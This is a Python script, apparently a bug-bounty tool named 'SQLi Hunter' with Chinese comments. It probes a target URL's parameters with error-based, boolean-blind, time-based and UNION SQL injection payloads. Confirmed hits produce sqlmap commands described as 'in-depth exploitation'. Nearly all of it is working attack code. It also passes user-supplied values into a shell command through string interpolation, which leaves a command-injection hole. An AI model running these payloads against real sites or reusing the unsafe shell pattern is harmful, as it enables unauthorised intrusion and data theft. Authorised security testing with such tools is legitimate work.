#!/usr/bin/env python3
"""
SQLi Hunter - SQL注入快速检测与验证
比sqlmap更快的初步筛查，确认存在注入后再用sqlmap深入

用法:
  src-sqli-hunter.py <url>                         # 自动检测参数并测试
  src-sqli-hunter.py <url> --param id,name         # 指定参数
  src-sqli-hunter.py <url> --method POST --data 'id=1&name=test'
  src-sqli-hunter.py <url> --cookie 'session=xxx'  # 带cookie
  src-sqli-hunter.py <url> --batch                 # 自动模式(不交互)

原理:
  1. 基于响应差异检测(正常请求 vs 注入payload)
  2. 多种注入类型: 数字型/字符型/盲注/时间盲注/报错注入
  3. 确认后给出sqlmap命令
"""

import argparse
import hashlib
import os
import re
import subprocess
import sys
import time
import urllib.parse


def req(url, method="GET", data=None, cookie=None, headers=None, timeout=10):
    """Send HTTP request and return (status, headers, body, time)."""
    cmd = f"curl -sk --max-time {timeout} -D /tmp/sqli_hdr.txt -o /tmp/sqli_body.txt -w '%{{http_code}}|%{{time_total}}' "
    if method == "POST" and data:
        cmd += f"-X POST -d '{data}' "
    if cookie:
        cmd += f"-b '{cookie}' "
    if headers:
        for h in headers:
            cmd += f"-H '{h}' "
    cmd += f"'{url}'"

    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout+5)
        output = r.stdout.strip()
        parts = output.split('|')
        status = parts[0] if parts else ''
        resp_time = float(parts[1]) if len(parts) > 1 else 0

        with open('/tmp/sqli_hdr.txt', 'r') as f:
            hdr = f.read()
        with open('/tmp/sqli_body.txt', 'r') as f:
            body = f.read()

        return status, hdr, body, resp_time
    except Exception:
        return '', '', '', 0


def detect_params(url, method="GET", data=None):
    """Detect injectable parameters from URL and data."""
    params = []

    # From URL query string
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    for p in qs:
        params.append(p)

    # From POST data
    if data:
        post_params = urllib.parse.parse_qs(data)
        for p in post_params:
            if p not in params:
                params.append(p)

    return params


def test_error_based(url, param, method="GET", data=None, cookie=None):
    """Test for error-based SQL injection."""
    payloads = [
        ("'", "syntax error|mysql|SQL|ORA-|postgresql|sqlite|microsoft|unclosed", "单引号注入"),
        ("\"", "syntax error|mysql|SQL|ORA-|postgresql|sqlite|microsoft|unclosed", "双引号注入"),
        ("1' OR '1'='1", "syntax error|mysql|SQL|ORA-|multiple rows", "OR注入"),
        ("1 AND 1=CONVERT(int,(SELECT @@version))", "CONVERT|@@version|mysql", "MSSQL报错"),
        ("1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", "XPATH|extractvalue|@@version", "MySQL报错注入"),
        ("1' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- -", "XPATH|updatexml|@@version", "MySQL报错注入2"),
    ]

    results = []
    # Get baseline
    baseline_status, _, baseline_body, _ = req(url, method, data, cookie)
    baseline_len = len(baseline_body)
    baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:16]

    for payload, pattern, desc in payloads:
        # Inject into parameter
        test_url, test_data = inject(url, param, payload, method, data)
        status, _, body, resp_time = req(test_url, method, test_data, cookie)

        if re.search(pattern, body, re.I):
            results.append({
                "type": "error_based",
                "param": param,
                "payload": payload,
                "desc": desc,
                "evidence": re.search(pattern, body, re.I).group()[:100],
                "confidence": "HIGH"
            })
            break  # One confirmation is enough

    return results


def test_boolean_based(url, param, method="GET", data=None, cookie=None):
    """Test for boolean-based blind SQL injection."""
    results = []

    # Get baseline
    _, _, baseline_body, _ = req(url, method, data, cookie)
    baseline_len = len(baseline_body)
    baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:16]

    # True condition
    true_payloads = [
        ("1 AND 1=1", "数字型"),
        ("' AND '1'='1", "字符型"),
        ("1' AND '1'='1'-- -", "字符型+注释"),
    ]

    # False condition
    false_payloads = [
        ("1 AND 1=2", "数字型"),
        ("' AND '1'='2", "字符型"),
        ("1' AND '1'='2'-- -", "字符型+注释"),
    ]

    for (true_p, desc_t), (false_p, desc_f) in zip(true_payloads, false_payloads):
        # True request
        test_url, test_data = inject(url, param, true_p, method, data)
        _, _, true_body, _ = req(test_url, method, test_data, cookie)
        true_len = len(true_body)
        true_hash = hashlib.md5(true_body.encode()).hexdigest()[:16]

        # False request
        test_url, test_data = inject(url, param, false_p, method, data)
        _, _, false_body, _ = req(test_url, method, test_data, cookie)
        false_len = len(false_body)
        false_hash = hashlib.md5(false_body.encode()).hexdigest()[:16]

        # Compare: true should be similar to baseline, false should differ
        if (true_hash == baseline_hash and false_hash != baseline_hash) or \
           (abs(true_len - baseline_len) < 50 and abs(false_len - baseline_len) > 200):
            results.append({
                "type": "boolean_blind",
                "param": param,
                "true_payload": true_p,
                "false_payload": false_p,
                "desc": desc_t,
                "true_len": true_len,
                "false_len": false_len,
                "baseline_len": baseline_len,
                "confidence": "HIGH"
            })
            break

    return results


def test_time_based(url, param, method="GET", data=None, cookie=None):
    """Test for time-based blind SQL injection."""
    results = []

    payloads = [
        ("1' AND SLEEP(5)-- -", 5, "MySQL SLEEP"),
        ("1 AND SLEEP(5)", 5, "MySQL SLEEP(数字)"),
        ("'; WAITFOR DELAY '0:0:5'-- -", 5, "MSSQL WAITFOR"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", 5, "MySQL子查询SLEEP"),
        ("1'; SELECT pg_sleep(5)-- -", 5, "PostgreSQL pg_sleep"),
    ]

    for payload, delay, desc in payloads:
        test_url, test_data = inject(url, param, payload, method, data)

        t0 = time.time()
        status, _, body, resp_time = req(test_url, method, test_data, cookie, timeout=delay+10)
        elapsed = time.time() - t0

        if elapsed >= delay * 0.8:  # Allow 20% tolerance
            results.append({
                "type": "time_blind",
                "param": param,
                "payload": payload,
                "desc": desc,
                "expected_delay": delay,
                "actual_delay": round(elapsed, 2),
                "confidence": "HIGH"
            })
            break

    return results


def test_union_based(url, param, method="GET", data=None, cookie=None):
    """Test for UNION-based SQL injection."""
    results = []

    # First detect column count
    for cols in range(1, 20):
        order_payload = f"1 ORDER BY {cols}-- -"
        test_url, test_data = inject(url, param, order_payload, method, data)
        status, _, body, _ = req(test_url, method, test_data, cookie)

        if 'error' in body.lower() or 'syntax' in body.lower() or status.startswith('5'):
            col_count = cols - 1
            if col_count > 0:
                # Try UNION SELECT
                nulls = ','.join(['NULL'] * col_count)
                union_payload = f"-1 UNION SELECT {nulls}-- -"
                test_url, test_data = inject(url, param, union_payload, method, data)
                status, _, body, _ = req(test_url, method, test_data, cookie)

                # Check if response changed (UNION result appeared)
                _, _, baseline_body, _ = req(url, method, data, cookie)
                if body != baseline_body and len(body) > 0:
                    results.append({
                        "type": "union_based",
                        "param": param,
                        "columns": col_count,
                        "payload": union_payload,
                        "confidence": "MEDIUM"
                    })
            break

    return results


def inject(url, param, payload, method="GET", data=None):
    """Inject payload into parameter. Returns (modified_url, modified_data)."""
    if method == "GET":
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if param in qs:
            qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        return new_url, None
    else:
        if data:
            params = urllib.parse.parse_qs(data, keep_blank_values=True)
            if param in params:
                params[param] = [payload]
            new_data = urllib.parse.urlencode(params, doseq=True)
            return url, new_data
    return url, data


def run_sqlmap(url, param, method="GET", data=None, cookie=None):
    """Generate sqlmap command for confirmed injection."""
    cmd = f"sqlmap -u '{url}'"
    if param:
        cmd += f" -p {param}"
    if method == "POST" and data:
        cmd += f" --data='{data}'"
    if cookie:
        cmd += f" --cookie='{cookie}'"
    cmd += " --batch --level=3 --risk=2 --random-agent --threads=5"
    cmd += " --technique=BEUSTQ"
    return cmd


def main():
    parser = argparse.ArgumentParser(description="SQLi Hunter - SQL注入快速检测")
    parser.add_argument("url", help="目标URL (如 https://target.com/page?id=1)")
    parser.add_argument("--param", "-p", help="指定参数(逗号分隔)")
    parser.add_argument("--method", "-m", default="GET", help="HTTP方法(GET/POST)")
    parser.add_argument("--data", "-d", help="POST数据")
    parser.add_argument("--cookie", "-c", help="Cookie")
    parser.add_argument("--header", "-H", action="append", help="自定义Header")
    parser.add_argument("--batch", action="store_true", help="自动模式")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时(秒)")
    args = parser.parse_args()

    url = args.url
    method = args.method.upper()
    data = args.data
    cookie = args.cookie
    headers = args.header

    print(f"[*] SQLi Hunter")
    print(f"[*] 目标: {url}")
    print(f"[*] 方法: {method}")
    print()

    # Detect parameters
    if args.param:
        params = args.param.split(',')
    else:
        params = detect_params(url, method, data)
        if not params:
            print("[!] 未发现参数，请用 --param 指定")
            sys.exit(1)
        print(f"[*] 自动检测到参数: {', '.join(params)}")

    all_findings = []

    for param in params:
        print(f"\n[*] 测试参数: {param}")

        # 1. Error-based
        print(f"  [1/4] 报错注入...")
        findings = test_error_based(url, param, method, data, cookie)
        if findings:
            print(f"  [!] 报错注入: {findings[0]['desc']} → {findings[0]['evidence'][:50]}")
            all_findings.extend(findings)
            continue
        print(f"  [-] 未检测到")

        # 2. Boolean-based
        print(f"  [2/4] 布尔盲注...")
        findings = test_boolean_based(url, param, method, data, cookie)
        if findings:
            print(f"  [!] 布尔盲注: True={findings[0]['true_len']}B, False={findings[0]['false_len']}B, Baseline={findings[0]['baseline_len']}B")
            all_findings.extend(findings)
            continue
        print(f"  [-] 未检测到")

        # 3. Time-based
        print(f"  [3/4] 时间盲注...")
        findings = test_time_based(url, param, method, data, cookie)
        if findings:
            print(f"  [!] 时间盲注: {findings[0]['desc']} 延迟{findings[0]['actual_delay']}s(预期{findings[0]['expected_delay']}s)")
            all_findings.extend(findings)
            continue
        print(f"  [-] 未检测到")

        # 4. UNION-based
        print(f"  [4/4] UNION注入...")
        findings = test_union_based(url, param, method, data, cookie)
        if findings:
            print(f"  [!] UNION注入: {findings[0]['columns']}列")
            all_findings.extend(findings)
            continue
        print(f"  [-] 未检测到")

    # Summary
    print()
    print("=" * 60)
    if all_findings:
        print(f"[!] 发现 {len(all_findings)} 个SQL注入漏洞!")
        for f in all_findings:
            print(f"\n  参数: {f['param']}")
            print(f"  类型: {f['type']} ({f['desc']})")
            print(f"  置信度: {f['confidence']}")
            if 'payload' in f:
                print(f"  Payload: {f['payload']}")

        # Generate sqlmap command
        print(f"\n{'=' * 60}")
        print("[*] sqlmap深入利用命令:")
        for f in all_findings:
            cmd = run_sqlmap(url, f['param'], method, data, cookie)
            print(f"  {cmd}")
    else:
        print("[*] 未检测到SQL注入")
        print("[*] 建议:")
        print("  1. 尝试 --param 指定其他参数")
        print("  2. 使用 --cookie 带登录态测试")
        print("  3. 使用 sqlmap --level=5 --risk=3 深度扫描")
    print("=" * 60)


if __name__ == "__main__":
    main()
